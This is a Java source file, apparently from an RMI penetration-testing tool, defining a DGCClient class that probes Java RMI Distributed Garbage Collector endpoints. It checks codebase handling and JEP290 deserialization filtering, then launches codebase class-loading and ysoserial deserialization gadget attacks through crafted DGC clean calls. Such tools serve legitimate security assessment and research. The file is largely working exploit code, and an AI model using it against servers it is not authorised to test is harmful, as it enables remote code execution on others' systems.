package de.qtc.rmg.operations;

import java.io.IOException;
import java.net.SocketException;
import java.rmi.UnknownHostException;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteRef;
import java.util.HashMap;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.MaliciousOutputStream;
import de.qtc.rmg.networking.RMIWhisperer;
import de.qtc.rmg.utils.DefinitelyNonExistingClass;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.StreamRemoteCall;

@SuppressWarnings("restriction")
public class DGCClient {

    private RMIWhisperer rmi;
    private static final long interfaceHash = -669196253586618813L;


    public DGCClient(RMIWhisperer rmiRegistry)
    {
        this.rmi = rmiRegistry;
    }

    public void enumDGC()
    {
        try {
            Logger.printlnBlue("RMI DGC enumeration:");
            Logger.println("");
            Logger.increaseIndent();

            MaliciousOutputStream.setDefaultLocation("InvalidURL");
            cleanCall(new DefinitelyNonExistingClass(), true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);
            Throwable c = ExceptionHandler.getThrowable("ClassNotFoundException", e);

            if( c != null ) {

                if( c.getMessage().contains("no security manager: RMI class loader disabled") ) {
                    Logger.printlnMixedYellow("- RMI server", "does not", "use a SecurityManager during DGC operations.");
                    Logger.printlnMixedYellow("  --> Remote class loading attacks", "are not", "possible.");
                    Logger.statusOutdated();
                    ExceptionHandler.showStackTrace(e);

                } else if( c.getMessage().contains("access to class loader denied") ) {
                    Logger.printlnMixedYellow("- Security Manager", "rejected access", "to the class loader.");
                    Logger.printlnMixedBlue("  --> The DGC uses most likely a", "separate security policy.");
                    Logger.statusDefault();
                    ExceptionHandler.showStackTrace(e);

                } else if( c.getMessage().equals("de.qtc.rmg.utils.DefinitelyNonExistingClass")) {
                    Logger.printlnMixedYellow("- RMI server", "did not", "attempt to parse the supplied codebase.");
                    Logger.printlnMixedBlue("  --> DGC is most likely configured with", "useCodebaseOnly=false.");
                    Logger.statusDefault();
                    ExceptionHandler.showStackTrace(e);

                } else {
                    ExceptionHandler.unexpectedException(e, "DGC", "enumeration", false);
                }

            } else if( t instanceof java.net.MalformedURLException) {
                Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during clean call.");
                Logger.printMixedBlue("  --> The DGC", "attempted to parse", "the provided codebase ");
                Logger.printlnPlainYellow("(useCodebaseOnly=false).");
                Logger.statusNonDefault();
                ExceptionHandler.showStackTrace(e);

            } else {
                ExceptionHandler.unexpectedException(e, "DGC", "enumeration", false);
            }

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "DGC", "enumeration", false);

        } finally {
            Logger.decreaseIndent();
            MaliciousOutputStream.resetDefaultLocation();
        }
    }

    public void enumJEP290()
    {
        try {
            Logger.printlnBlue("RMI server JEP290 enumeration:");
            Logger.println("");
            Logger.increaseIndent();

            cleanCall(new HashMap<String,String>(), false);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                Logger.printMixedYellow("- DGC", "rejected", "deserialization of");
                Logger.printPlainBlue(" java.util.HashMap");
                Logger.printlnPlainYellow(" (JEP290 is installed).");
                Logger.statusOk();
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                Logger.printMixedYellow("- DGC", "accepted", "deserialization of");
                Logger.printPlainBlue(" java.util.HashMap");
                Logger.printlnPlainYellow(" (JEP290 is not installed).");
                Logger.statusVulnerable();
                ExceptionHandler.showStackTrace(e);

            } else {
                ExceptionHandler.unexpectedException(e, "JEP290", "enumeration", false);
            }

        } catch( java.lang.ClassCastException e ) {
            Logger.printMixedYellow("- DGC", "accepted", "deserialization of");
            Logger.printPlainBlue(" java.util.HashMap");
            Logger.printlnPlainYellow(" (JEP290 is not installed).");
            Logger.statusVulnerable();
            ExceptionHandler.showStackTrace(e);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "JEP290", "enumeration", false);

        } finally {
            Logger.decreaseIndent();
        }
    }

    public void codebaseCleanCall(Object payload)
    {
        String className = payload.getClass().getName();

        try {
            Logger.printlnBlue("Attempting codebase attack on DGC endpoint...");
            Logger.print("Using class ");
            Logger.printPlainMixedBlueFirst(className, "with codebase", System.getProperty("java.rmi.server.codebase"));
            Logger.printlnPlainMixedYellow(" during", "clean", "call.");
            Logger.println("");
            Logger.increaseIndent();

            cleanCall(payload, false);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.invalidClass(e, "DGC", className);
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
                ExceptionHandler.unsupportedClassVersion(e, "clean", "call");

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains("RMI class loader disabled") ) {
                ExceptionHandler.codebaseSecurityManager(e);

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains(className)) {
                ExceptionHandler.codebaseClassNotFound(e, className);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.codebaseClassCast(e, false);

            } else if( cause instanceof java.security.AccessControlException) {
                ExceptionHandler.accessControl(e, "clean", "call");

            } else {
                ExceptionHandler.unexpectedException(e, "clean", "call", false);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.codebaseClassCast(e, false);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "clean", "call", false);
        }
    }

    public void attackCleanCall(Object payload)
    {
        try {
            Logger.printlnBlue("Attempting ysoserial attack on DGC endpoint...");
            Logger.println("");
            Logger.increaseIndent();

            cleanCall(payload, false);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.invalidClass(e, "DGC", "gadget-class");

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                ExceptionHandler.deserializeClassNotFound(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.deserlializeClassCast(e, false);

            } else {
                ExceptionHandler.unknownDeserializationException(e);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.deserlializeClassCast(e, false);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "clean", "call", false);
        }
    }

    /**
     * Make a call to the Distributed Garbage Collector (DGC) of an RMI endpoint.
     *
     * @param hostname the targeted hostname where the rmiregistry is located
     * @param port the
     * @param payloadObject
     * @throws Exception
     * @throws IOException
     * @throws UnknownHostException
     * @throws SocketException
     */
    @SuppressWarnings("deprecation")
    public void cleanCall(Object payloadObject, boolean maliciousStream) throws Exception
    {
        try {
            Endpoint endpoint = rmi.getEndpoint();
            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.DGC_ID), endpoint, false));

            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, 0, interfaceHash);
            try {
                java.io.ObjectOutput out = call.getOutputStream();
                out.writeObject(new ObjID[] {});
                out.writeLong(0L);
                out.writeObject(payloadObject);
                out.writeBoolean(true);

            } catch(java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling arguments", e);
            }

            remoteRef.invoke(call);
            remoteRef.done(call);

        } catch(java.rmi.ConnectException e) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
                ExceptionHandler.connectionRefused(e, "clean", "call");

            } else {
                ExceptionHandler.unexpectedException(e, "clean", "call", true);
            }

        } catch(java.rmi.ConnectIOException e) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.net.NoRouteToHostException) {
                ExceptionHandler.noRouteToHost(e, "clean", "call");

            } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
                ExceptionHandler.noJRMPServer(e, "clean", "call");

            } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
                ExceptionHandler.sslError(e, "clean", "call");

            } else {
                ExceptionHandler.unexpectedException(e, "clean", "call", true);
            }
        }
    }
}
